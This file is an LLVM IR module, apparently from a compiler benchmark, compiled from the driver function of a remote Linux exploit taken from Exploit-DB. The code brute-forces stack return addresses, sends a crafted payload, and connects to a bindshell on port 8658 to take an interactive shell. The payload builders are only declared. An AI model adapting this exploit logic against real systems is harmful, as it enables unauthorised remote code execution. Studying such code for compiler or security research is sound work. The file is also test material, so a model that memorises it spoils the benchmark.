; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_24093.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_24093.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.targets = type { i32 }

@opt_flags = common dso_local global i32 0, align 4
@OPT_BRUTE = common dso_local global i32 0, align 4
@STACK_START = common dso_local global i64 0, align 8
@STACK_END = common dso_local global i64 0, align 8
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"[+] Trying %#x\0A\00", align 1
@timeout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"[-] Exploit failed!\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"[+] Exploit success!\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"[+] Waiting for shell\0A\00", align 1
@steps = common dso_local global i64 0, align 8
@OPT_CHECK = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [30 x i8] c"[+] Checking for vulnability\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @exploit(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca %struct.targets, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = getelementptr inbounds %struct.targets, %struct.targets* %5, i32 0, i32 0
  store i32 %2, i32* %11, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  %12 = load i32, i32* @opt_flags, align 4
  %13 = load i32, i32* @OPT_BRUTE, align 4
  %14 = and i32 %12, %13
  %15 = icmp ne i32 %14, 0
  br i1 %15, label %16, label %57

16:                                               ; preds = %3
  %17 = load i64, i64* @STACK_START, align 8
  store i64 %17, i64* %10, align 8
  br label %18

18:                                               ; preds = %52, %16
  %19 = load i64, i64* %10, align 8
  %20 = load i64, i64* @STACK_END, align 8
  %21 = icmp sgt i64 %19, %20
  br i1 %21, label %22, label %56

22:                                               ; preds = %18
  %23 = load i32, i32* @stdout, align 4
  %24 = load i64, i64* %10, align 8
  %25 = call i32 (i32, i8*, ...) @fprintf(i32 %23, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0), i64 %24)
  %26 = getelementptr inbounds %struct.targets, %struct.targets* %5, i32 0, i32 0
  %27 = load i32, i32* %26, align 4
  %28 = call i8* @xp_create(i32 %27)
  store i8* %28, i8** %8, align 8
  %29 = load i8*, i8** %6, align 8
  %30 = load i32, i32* %7, align 4
  %31 = load i8*, i8** %8, align 8
  %32 = call i32 @xp_send(i8* %29, i32 %30, i8* %31)
  %33 = load i32, i32* @timeout, align 4
  %34 = call i32 @sleep(i32 %33)
  %35 = load i8*, i8** %6, align 8
  %36 = call i32 @connect_host(i8* %35, i32 8658)
  store i32 %36, i32* %9, align 4
  %37 = load i32, i32* %9, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %44

39:                                               ; preds = %22
  %40 = load i32, i32* @stdout, align 4
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %40, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %42 = load i8*, i8** %8, align 8
  %43 = call i32 @xp_destroy(i8* %42)
  br label %51

44:                                               ; preds = %22
  %45 = load i32, i32* @stdout, align 4
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %45, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %47 = load i32, i32* @stdout, align 4
  %48 = call i32 (i32, i8*, ...) @fprintf(i32 %47, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %49 = load i32, i32* %9, align 4
  %50 = call i32 @shell(i32 %49)
  br label %56

51:                                               ; preds = %39
  br label %52

52:                                               ; preds = %51
  %53 = load i64, i64* @steps, align 8
  %54 = load i64, i64* %10, align 8
  %55 = sub nsw i64 %54, %53
  store i64 %55, i64* %10, align 8
  br label %18

56:                                               ; preds = %44, %18
  br label %98

57:                                               ; preds = %3
  %58 = load i32, i32* @opt_flags, align 4
  %59 = load i32, i32* @OPT_CHECK, align 4
  %60 = and i32 %58, %59
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %65

62:                                               ; preds = %57
  %63 = load i32, i32* @stdout, align 4
  %64 = call i32 (i32, i8*, ...) @fprintf(i32 %63, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0))
  br label %70

65:                                               ; preds = %57
  %66 = load i32, i32* @stdout, align 4
  %67 = getelementptr inbounds %struct.targets, %struct.targets* %5, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 (i32, i8*, ...) @fprintf(i32 %66, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0), i32 %68)
  br label %70

70:                                               ; preds = %65, %62
  %71 = getelementptr inbounds %struct.targets, %struct.targets* %5, i32 0, i32 0
  %72 = load i32, i32* %71, align 4
  %73 = call i8* @xp_create(i32 %72)
  store i8* %73, i8** %8, align 8
  %74 = load i8*, i8** %6, align 8
  %75 = load i32, i32* %7, align 4
  %76 = load i8*, i8** %8, align 8
  %77 = call i32 @xp_send(i8* %74, i32 %75, i8* %76)
  %78 = call i32 @sleep(i32 2)
  %79 = load i8*, i8** %6, align 8
  %80 = call i32 @connect_host(i8* %79, i32 8658)
  store i32 %80, i32* %9, align 4
  %81 = load i32, i32* %9, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %89

83:                                               ; preds = %70
  %84 = load i32, i32* @stdout, align 4
  %85 = call i32 (i32, i8*, ...) @fprintf(i32 %84, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %86 = load i8*, i8** %8, align 8
  %87 = call i32 @xp_destroy(i8* %86)
  %88 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %88, i32* %4, align 4
  br label %99

89:                                               ; preds = %70
  %90 = load i32, i32* @stdout, align 4
  %91 = call i32 (i32, i8*, ...) @fprintf(i32 %90, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %92 = load i32, i32* @stdout, align 4
  %93 = call i32 (i32, i8*, ...) @fprintf(i32 %92, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %94 = call i32 @sleep(i32 1)
  %95 = load i32, i32* %9, align 4
  %96 = call i32 @shell(i32 %95)
  br label %97

97:                                               ; preds = %89
  br label %98

98:                                               ; preds = %97, %56
  store i32 0, i32* %4, align 4
  br label %99

99:                                               ; preds = %98, %83
  %100 = load i32, i32* %4, align 4
  ret i32 %100
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i8* @xp_create(i32) #1

declare dso_local i32 @xp_send(i8*, i32, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @connect_host(i8*, i32) #1

declare dso_local i32 @xp_destroy(i8*) #1

declare dso_local i32 @shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
